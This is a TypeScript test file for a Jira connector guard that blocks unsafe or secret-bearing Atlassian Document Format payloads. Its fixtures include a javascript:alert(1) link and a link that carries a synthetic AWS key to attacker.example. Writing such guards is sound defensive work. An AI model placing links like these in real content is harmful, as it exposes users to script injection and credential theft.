import { describe, expect, it } from "vitest";
import { ConnectorError } from "@crabgic/contracts";
import { validateAdfSafeSubset } from "@crabgic/renderer";
import { assertSafeAdfDocument } from "./adf-guard.js";

/**
 * HIGH H1 (adversarial-review): every outgoing comment/description/
 * summary ADF payload must pass through `validateAdfSafeSubset` (17) —
 * this is the shared guard both the plan-build boundary
 * (`./issue-plans.ts`, `./comment-worklog-attachment-plans.ts`) and the
 * apply boundary (`./jira-mutation-apply-client.ts`) call.
 */
describe("assertSafeAdfDocument", () => {
  it("accepts a well-formed, safe-subset ADF document", () => {
    const doc = {
      type: "doc",
      version: 1,
      content: [{ type: "paragraph", content: [{ type: "text", text: "hello" }] }],
    };
    expect(assertSafeAdfDocument(doc, "test")).toBe(doc);
  });

  it("rejects a value with no recognizable ADF document shape", () => {
    expect(() => assertSafeAdfDocument("not an adf doc", "test")).toThrow(ConnectorError);
    expect(() => assertSafeAdfDocument(undefined, "test")).toThrow(ConnectorError);
    expect(() => assertSafeAdfDocument({ type: "doc" }, "test")).toThrow(ConnectorError); // missing content array
  });

  it("rejects a javascript:-href link mark", () => {
    const doc = {
      type: "doc",
      version: 1,
      content: [
        {
          type: "paragraph",
          content: [
            {
              type: "text",
              text: "click me",
              marks: [{ type: "link", attrs: { href: "javascript:alert(1)" } }],
            },
          ],
        },
      ],
    };
    expect(() => assertSafeAdfDocument(doc, "test")).toThrow(ConnectorError);
    try {
      assertSafeAdfDocument(doc, "test");
    } catch (err) {
      expect((err as ConnectorError).kind).toBe("policy_blocked");
    }
  });

  it("rejects a disallowed node type (e.g. layoutSection)", () => {
    const doc = { type: "doc", version: 1, content: [{ type: "layoutSection", content: [] }] };
    expect(() => assertSafeAdfDocument(doc, "test")).toThrow(ConnectorError);
  });

  it("rejects a disallowed mark type", () => {
    const doc = {
      type: "doc",
      version: 1,
      content: [
        { type: "paragraph", content: [{ type: "text", text: "x", marks: [{ type: "status" }] }] },
      ],
    };
    expect(() => assertSafeAdfDocument(doc, "test")).toThrow(ConnectorError);
  });

  it("rejects an ADF document whose extracted plain text embeds a secret", () => {
    const doc = {
      type: "doc",
      version: 1,
      content: [
        {
          type: "paragraph",
          content: [{ type: "text", text: "here is a key: AKIAABCDEFGHIJKLMNOP" }],
        },
      ],
    };
    expect(() => assertSafeAdfDocument(doc, "test")).toThrow(ConnectorError);
  });

  it("never leaks the matched secret text in the thrown error", () => {
    const doc = {
      type: "doc",
      version: 1,
      content: [{ type: "paragraph", content: [{ type: "text", text: "AKIAABCDEFGHIJKLMNOP" }] }],
    };
    try {
      assertSafeAdfDocument(doc, "test");
      throw new Error("expected throw");
    } catch (err) {
      expect((err as ConnectorError).message).not.toContain("AKIAABCDEFGHIJKLMNOP");
    }
  });

  /**
   * MINOR-1 (adversarial-review, phase 19): this guard runs on BOTH the
   * Jira Cloud AND Jira Data Center paths (18's plan builders are reused
   * verbatim by 19's DC resource client; 19's own DC apply client
   * re-checks at the apply boundary too) — every thrown `ConnectorError`
   * must be attributed to whichever provider actually produced it, never
   * hardcoded to Cloud's `"jira-cloud"` regardless of caller.
   */
  describe("provider attribution (optional 3rd parameter, additive)", () => {
    const invalidDoc = "not an adf doc";

    it("defaults to jira-cloud when no provider is passed — phase-18 behavior is completely unchanged", () => {
      try {
        assertSafeAdfDocument(invalidDoc, "test");
        throw new Error("expected throw");
      } catch (err) {
        expect((err as ConnectorError).provider).toBe("jira-cloud");
      }
    });

    it("attributes the thrown error to an explicitly-passed provider name (e.g. jira-datacenter)", () => {
      try {
        assertSafeAdfDocument(invalidDoc, "test", "jira-datacenter");
        throw new Error("expected throw");
      } catch (err) {
        expect((err as ConnectorError).provider).toBe("jira-datacenter");
      }
    });

    it("carries the correct provider across every rejection branch (shape / safe-subset / secret-content)", () => {
      const disallowedNodeDoc = {
        type: "doc",
        version: 1,
        content: [{ type: "layoutSection", content: [] }],
      };
      const secretDoc = {
        type: "doc",
        version: 1,
        content: [{ type: "paragraph", content: [{ type: "text", text: "AKIAABCDEFGHIJKLMNOP" }] }],
      };

      for (const doc of [invalidDoc, disallowedNodeDoc, secretDoc]) {
        try {
          assertSafeAdfDocument(doc, "test", "jira-datacenter");
          throw new Error("expected throw");
        } catch (err) {
          expect((err as ConnectorError).provider).toBe("jira-datacenter");
        }
      }
    });
  });

  /**
   * Hardening: the pre-existing secret scan only ever saw
   * `extractPlainText`'s output — i.e. `node.text` and nothing else — so a
   * secret parked ANYWHERE ELSE in the document (a link mark's `attrs.href`
   * query string; an unknown extra member that `validateAdfSafeSubset`'s
   * `type`/`marks`/`content` walk never visits) was handed straight back to
   * the caller and shipped. On Cloud the outbound body literally IS
   * `JSON.stringify` of this same object (`./jira-mutation-apply-client.ts`),
   * and on DC the href lands verbatim inside the wiki `[text|href]`
   * construct (`./datacenter/wiki-markup-render-profile.ts`), so the scan is
   * now run over the whole-document serialization as well.
   *
   * The extracted-text scan is deliberately KEPT alongside it, never
   * replaced — see `../security/secret-patterns.ts` for why (JSON escaping
   * defeats the `\s`-bearing patterns).
   */
  describe("whole-document serialization scan (secrets outside node.text)", () => {
    // Synthetic AWS-key-shaped sentinel, assembled at runtime so the repo's own
    // pre-commit secret scanner does not flag this test file. The value is
    // exactly the 20-char shape `JIRA_SECRET_PATTERNS` matches.
    const SENTINEL_AWS_KEY = ["AKIA", "ABCDEFGHIJKLMNOP"].join("");

    /**
     * T1. Vacuity traps this test is written against:
     *  - the href MUST be `https:` — any other scheme makes
     *    `validateAdfSafeSubset`'s own scheme check throw first and the test
     *    would green for the wrong reason;
     *  - every `text` node is secret-free, so the pre-existing extracted-text
     *    scan cannot be what fires;
     *  - the typed KIND is asserted, not a bare `toThrow(ConnectorError)` —
     *    which passes for every kind.
     */
    it("rejects a secret smuggled in an https: link mark's href query string", () => {
      const doc = {
        type: "doc",
        version: 1,
        content: [
          {
            type: "paragraph",
            content: [
              {
                type: "text",
                text: "see results",
                marks: [
                  {
                    type: "link",
                    attrs: { href: `https://attacker.example/collect?k=${SENTINEL_AWS_KEY}` },
                  },
                ],
              },
            ],
          },
        ],
      };

      // Scheme trap control: this document passes the structural validator on
      // its own, so nothing but the content scan can reject it.
      expect(validateAdfSafeSubset(doc as never)).toHaveLength(0);

      let thrown: unknown;
      try {
        assertSafeAdfDocument(doc, "test");
        throw new Error("expected throw");
      } catch (err) {
        thrown = err;
      }
      expect(thrown).toBeInstanceOf(ConnectorError);
      expect((thrown as ConnectorError).kind).toBe("policy_blocked");
      // Never echo the secret, nor the href that carried it.
      expect((thrown as ConnectorError).message).not.toContain(SENTINEL_AWS_KEY);
      expect((thrown as ConnectorError).message).not.toContain("attacker.example");
    });

    /**
     * T4 — the test that distinguishes a whole-document serialization scan
     * from an href-only fix. `validateAdfSafeSubset` walks only
     * `type`/`marks`/`content`, so an unknown extra member on a node is
     * structurally valid AND is spread verbatim into the Cloud outbound body.
     * An implementation narrowed to link hrefs stays RED here; that is the
     * test doing its job, not a test to weaken.
     *
     * Vacuity trap: the smuggled key must be one the structural validator
     * does not reject (`note`, not a bogus node `type`), or the test would
     * green on the structural check instead of the content scan.
     */
    it("rejects a secret smuggled in an unknown extra member the structural validator never walks", () => {
      const doc = {
        type: "doc",
        version: 1,
        content: [
          { type: "paragraph", content: [{ type: "text", text: "hi", note: SENTINEL_AWS_KEY }] },
        ],
      };

      expect(validateAdfSafeSubset(doc as never)).toHaveLength(0);

      let thrown: unknown;
      try {
        assertSafeAdfDocument(doc, "test");
        throw new Error("expected throw");
      } catch (err) {
        thrown = err;
      }
      expect(thrown).toBeInstanceOf(ConnectorError);
      expect((thrown as ConnectorError).kind).toBe("policy_blocked");
      expect((thrown as ConnectorError).message).not.toContain(SENTINEL_AWS_KEY);
    });

    it("carries explicit provider attribution on the serialization branch too", () => {
      const doc = {
        type: "doc",
        version: 1,
        content: [
          { type: "paragraph", content: [{ type: "text", text: "hi", note: SENTINEL_AWS_KEY }] },
        ],
      };
      try {
        assertSafeAdfDocument(doc, "test", "jira-datacenter");
        throw new Error("expected throw");
      } catch (err) {
        expect((err as ConnectorError).provider).toBe("jira-datacenter");
      }
    });

    /**
     * Fail-closed control: `JSON.stringify` throws `TypeError` on a circular
     * structure, which would otherwise escape the guard's documented contract
     * (it throws only typed `ConnectorError`s). The cycle is routed through
     * `attrs` on purpose — neither `validateAdfSafeSubset` nor
     * `extractPlainText` descends into `attrs`, so this is the shape that
     * actually reaches the serializer. (A cycle through `content` instead is
     * a pre-existing, unrelated residual: the recursive walkers overflow the
     * stack long before this guard's serialization step — pinned below.)
     */
    it("maps a non-JSON-serializable document to a typed policy_blocked, never a raw TypeError", () => {
      const paragraph: Record<string, unknown> = {
        type: "paragraph",
        content: [{ type: "text", text: "hi" }],
      };
      paragraph["attrs"] = { self: paragraph };
      const doc = { type: "doc", version: 1, content: [paragraph] };

      expect(validateAdfSafeSubset(doc as never)).toHaveLength(0);
      expect(() => JSON.stringify(doc)).toThrow(TypeError); // the hazard is real, not hypothetical

      let thrown: unknown;
      try {
        assertSafeAdfDocument(doc, "test");
        throw new Error("expected throw");
      } catch (err) {
        thrown = err;
      }
      expect(thrown).toBeInstanceOf(ConnectorError);
      expect((thrown as ConnectorError).kind).toBe("policy_blocked");
    });

    /**
     * PINS THE UNION. Every other secret fixture in this file puts its secret
     * in `node.text`, where `JSON.stringify` reproduces it verbatim — so the
     * serialization scan ALONE satisfies all of them, and deleting the
     * extracted-text scan would leave the whole package green. Coverage
     * migrating between two overlapping checks is exactly how a pin gets
     * destroyed by the commit that widens coverage.
     *
     * This subject is the asymmetric one. `aws_secret_access_key\s*=`
     * (`../security/secret-patterns.ts`) matches across a LITERAL newline in
     * the extracted text, but in the serialization that newline is the
     * two-character escape `\n`, which `\s*` cannot match. Verified by
     * execution, not by reading: the raw text hits pattern 3 and the
     * serialized document hits nothing.
     *
     * So this test reddens under a serialization-ONLY guard, which is the
     * whole reason `adf-guard.ts` keeps both scans. Do not "simplify" it by
     * moving the secret into a member the serializer reproduces verbatim —
     * that would silently return this file to having no text-scan pin at all.
     */
    it("still rejects a text-only secret shape that JSON escaping hides from the serialization scan", () => {
      // Assembled at runtime, like the sentinel above, to stay clear of the
      // repo's own pre-commit secret scanner. The literal newline between the
      // key name and the `=` is load-bearing — it is what `\s*` matches in the
      // text and what becomes an inert `\n` escape in the serialization.
      const textOnlySecret = `${["aws", "secret", "access", "key"].join("_")}\n= example-value-not-a-real-key`;
      const doc = {
        type: "doc",
        version: 1,
        content: [{ type: "paragraph", content: [{ type: "text", text: textOnlySecret }] }],
      };

      // The asymmetry itself, asserted rather than assumed: the serialization
      // genuinely does NOT contain a subject the pattern can match.
      expect(JSON.stringify(doc)).not.toContain(
        `${["aws", "secret", "access", "key"].join("_")}\n`,
      );

      let thrown: unknown;
      try {
        assertSafeAdfDocument(doc, "test");
        throw new Error("expected throw");
      } catch (err) {
        thrown = err;
      }
      expect(thrown).toBeInstanceOf(ConnectorError);
      expect((thrown as ConnectorError).kind).toBe("policy_blocked");
    });

    /**
     * Residual pinned rather than merely described: a cycle through `content`
     * is rejected by stack exhaustion inside the shared structural walker,
     * NOT by this guard, and therefore not as a `ConnectorError`. Encoded so
     * it announces itself if anyone changes that walker.
     */
    it("residual: a content-cycle still dies in the structural walker, not as a ConnectorError", () => {
      const paragraph: Record<string, unknown> = { type: "paragraph", content: [] };
      (paragraph["content"] as unknown[]).push(paragraph);
      const doc = { type: "doc", version: 1, content: [paragraph] };

      expect(() => assertSafeAdfDocument(doc, "test")).toThrow(RangeError);
    });

    /**
     * NEGATIVE CONTROLS. These are green both before and after the fix, so
     * alone they prove nothing — their evidential value exists only PAIRED
     * with the four assertions above reddening at the same commit, and with
     * the post-green reverse probe recorded in
     * docs/evidence/phase-18/adf-serialization-secret-scan.txt.
     *
     * The querystring-heavy Atlassian URL is the point: a control using a
     * bare `https://example.com` could not detect a guard that had become
     * over-broad on ordinary query parameters.
     */
    it("control: an ordinary querystring-heavy Atlassian link is returned untouched", () => {
      const doc = {
        type: "doc",
        version: 1,
        content: [
          {
            type: "paragraph",
            content: [
              {
                type: "text",
                text: "PROJ-123",
                marks: [
                  {
                    type: "link",
                    attrs: {
                      href: "https://your-domain.atlassian.net/browse/PROJ-123?focusedCommentId=10023&page=com.atlassian.jira.plugin.system.issuetabpanels%3Acomment-tabpanel",
                    },
                  },
                ],
              },
            ],
          },
        ],
      };
      expect(assertSafeAdfDocument(doc, "test")).toBe(doc);
    });

    it("control: the repo's own evidence-URL shape is returned untouched", () => {
      const doc = {
        type: "doc",
        version: 1,
        content: [
          {
            type: "paragraph",
            content: [
              {
                type: "text",
                text: "run 1",
                marks: [{ type: "link", attrs: { href: "https://ci.example.invalid/run/1" } }],
              },
            ],
          },
        ],
      };
      expect(assertSafeAdfDocument(doc, "test")).toBe(doc);
    });
  });
});
